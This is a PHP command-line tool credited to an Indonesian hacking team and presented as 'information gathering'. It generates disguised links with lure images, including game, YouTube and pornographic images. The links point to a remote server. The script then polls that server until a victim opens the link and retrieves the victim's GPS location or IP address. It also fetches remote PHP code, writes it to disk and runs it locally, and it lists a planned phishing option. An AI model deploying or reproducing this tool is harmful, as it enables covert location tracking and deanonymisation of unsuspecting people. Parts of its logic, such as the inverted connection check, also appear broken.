<?php 
/*
	Author 	: Brilly4n
	Team 	: { IndoSec }
	Tools 	: Information Gathering
	Fanspage: https://www.facebook.com/IndoSecOfficial
				{ OpenSourceCode }
*/

/*
	Configuration
*/
$version 	= '1.0.1';
$random 	= rand(123456789, 6);
$file 		= 'infogath_update.php';

$url 		= 'https://brad.josebernard.com/index/';

error_reporting(0);

// cek update
function updated($version, $file)
{
	$cek = file_get_contents('https://brad.josebernard.com/index/version.lst');
	$cek2 = explode("\n", $cek);
	if ($cek2[0] == $version) {
		echo "\n[-] Tidak Ada Pembaruan \n\n";
	}else{
		echo "\n[+] Mendownload Pembaruan Version : ";
		
		$curl = curl_init();
		curl_setopt($curl, CURLOPT_URL, 'https://raw.githubusercontent.com/indosecid/gps_tracking/master/gps.php');
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_HEADER, false);
		$data = curl_exec($curl);
		curl_close($curl);

		function get_download($file, $version, $data)
		{
			touch($file);
			$fp = fopen($file, 'w');
			fwrite($fp, $data);
			fclose($fp);

			echo "\n[+] Berhasil Mendownload Pembaruan Version : ".$version."\n[+] Filename : ".$file."\n\n";
			exit();
		}

		if (file_exists($file)) {
			if (unlink($file)) {
				get_download($file, $cek, $data);
			}
		}else{
			get_download($file, $cek, $data);
		}
		
	}
}

// cek koneksi
echo "\n[+] Mengecek Koneksi Internet ...";
$cek = get_headers('https://facebook.com');
if (!preg_match('/200/', $cek[0])) {
	
	echo "\n[+] Koneksi Stabil";
	echo "\n[+] Pembaruan ...";
	updated($version, $file);
}else{
	echo "\n\n[-] Tidak Ada Koneksi Internet :'( \n\n";
	exit();
}

function tampil()
{
	echo "
  ___        __        ____       _   _     
 |_ _|_ __  / _| ___  / ___| __ _| |_| |__  
  | || '_ \| |_ / _ \| |  _ / _` | __| '_ \ 
  | || | | |  _| (_) | |_| | (_| | |_| | | |
 |___|_| |_|_|  \___/ \____|\__,_|\__|_| |_| v.".$version."

       => Information Gathering <=                                        

Author   : Brilly4n Gates => { IndoSec }
Contact  : 085230516559 - timtam.rpl@gmail.com
FansPage : https://www.facebook.com/IndoSecOfficial/

	--GPS  --IP  --PHISING
 > ";
}

function proses($random)
{
	echo "\n\n[+] Created Link\n[+] ID Tracking  : $random \n[+] Parameter => : ?page= ";
}

function buat_link($input, $random, $url, $id, $img)
{	
	$imgs = base64_encode($img);

	$random2 = base64_encode($random);
	$url = 'Copy Link => '.$url.'home.php?redirect='.$input.'&page='.$random2.'&id='.$id.'&img='.$imgs;
	echo "\n\n[+] $url";
}

function download($random, $url, $opt, $port)
{

	echo file_get_contents($url . 'get/' . 'GPS_GET'.$random.'.html');

	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, $url.$opt.'_TRACK_'.$random.'.html');
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl, CURLOPT_HEADER, false);
	$data = curl_exec($curl);
	curl_close($curl);

	echo "\n[+] Downloading ";

	touch($opt.'_TRACK_'.$random.'.php');

	$fp = fopen($opt.'_TRACK_'.$random.'.php', 'w');
	fwrite($fp, $data);
	fclose($fp);

	echo "\n[+] Membuka File...";
	echo "\n\n[+] Buka Browser => : http://localhost:".$port;

	// run di localhost
	system('php -S localhost:'.$port.' '.$opt.'_TRACK_'.$random.'.php');
}

tampil();


$pilih = trim(fgets(STDIN));

if ($pilih == '--GPS' || $pilih == '--gps') {

	proses($random);
	$input = trim(fgets(STDIN));

	// set port
	echo "[+] Set PORT  => : ";
	$port = trim(fgets(STDIN));

	if (is_numeric($port)) {

		echo "\n(1) Youtube (2) PUBG (3) FreeFire (4) Anime (5) Bokep (6) Custom ? \n";
		echo "[+] Use Image => : ";
		$opsi_img = trim(fgets(STDIN));

		switch ($opsi_img) {
			case '1':
				$img = 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Logo_of_YouTube_%282015-2017%29.svg/1280px-Logo_of_YouTube_%282015-2017%29.svg.png';
				break;
			case '2':
				$img = 'https://res.cloudinary.com/teepublic/image/private/s---xiJeC7t--/t_Preview/b_rgb:191919,c_limit,f_jpg,h_630,q_90,w_630/v1535164327/production/designs/3064946_0.jpg';
				break;
			case '3':
				$img = 'http://cm1.narvii.com/6653/1c97d673ada4bcca12be337f6909a801c282eaad_00.jpg';
				break;
			case '4':
				$img = 'https://ih0.redbubble.net/image.397474907.7403/mp,550x550,matte,ffffff,t.3u1.jpg';
				break;
			case '5':
				$img = 'https://chinadailymail.files.wordpress.com/2014/04/22-japanese-girl.jpg?w=640';
				break;
			case '6':
				echo "[+] Image URL => : ";
				$img = trim(fgets(STDIN));
				break;
			default:
				exit();
			break;
		}

		buat_link($input, $random, $url, 1, $img);

		// litening
		echo "\n\n[+] Listening Target < ";
		$a = 1;
		for ($a; $a < 9999; $a++) { 
			
			$cek = get_headers($url.'GPS_TRACK_'.$random.'.html');

			// listen
			if (!preg_match("/200/", $cek[0])) {
				echo "=";
			}else{
				echo " >\n\n[+] Target TERTYPU 200 OK";
				break;
			}
			sleep(3);
		}
		// download
		download($random, $url, 'GPS', $port);	
	}else{
		echo "\n\n[-] PORT Harus Angka :'( \n\n";
	}

}elseif($pilih == '--IP' || $pilih == '--ip'){

	proses($random);
	$input = trim(fgets(STDIN));

	echo "\n(1) Youtube (2) PUBG (3) FreeFire (4) Anime (5) Bokep (6) Custom ? \n";
	echo "[+] Use Image => : ";
	$opsi_img = trim(fgets(STDIN));

	switch ($opsi_img) {
		case '1':
			$img = 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Logo_of_YouTube_%282015-2017%29.svg/1280px-Logo_of_YouTube_%282015-2017%29.svg.png';
			break;
		case '2':
			$img = 'https://res.cloudinary.com/teepublic/image/private/s---xiJeC7t--/t_Preview/b_rgb:191919,c_limit,f_jpg,h_630,q_90,w_630/v1535164327/production/designs/3064946_0.jpg';
			break;
		case '3':
			$img = 'http://cm1.narvii.com/6653/1c97d673ada4bcca12be337f6909a801c282eaad_00.jpg';
			break;
		case '4':
			$img = 'https://ih0.redbubble.net/image.397474907.7403/mp,550x550,matte,ffffff,t.3u1.jpg';
			break;
		case '5':
			$img = 'https://chinadailymail.files.wordpress.com/2014/04/22-japanese-girl.jpg?w=640';
			break;
		case '6':
			echo "[+] Image URL => : ";
			$img = trim(fgets(STDIN));
			break;
		default:
			exit();
		break;
	}

	buat_link($input, $random, $url, 2, $img);

	// litening
	echo "\n\n[+] Listening Target < ";
	$a = 1;
	for ($a; $a < 9999; $a++) { 
		
		$cek = get_headers($url.'get/IP_GET'.$random.'.html');

		// listen
		if (!preg_match("/200/", $cek[0])) {
			echo "=";
		}else{
			echo " >";
			$file = file_get_contents($url.'get/IP_GET'.$random.'.html');
			echo $file;
			break;
		}
		sleep(3);
	}

}elseif($pilih == '--PHISING'){
	echo "\n\n[-] Masih Di Bikin Bozzzz !!! \n\n";
}elseif($pilih == 'exit'){
	exit();
}else{

	echo "\n\n[-] Error Code :'(\n\n";
	exit();
}

?>
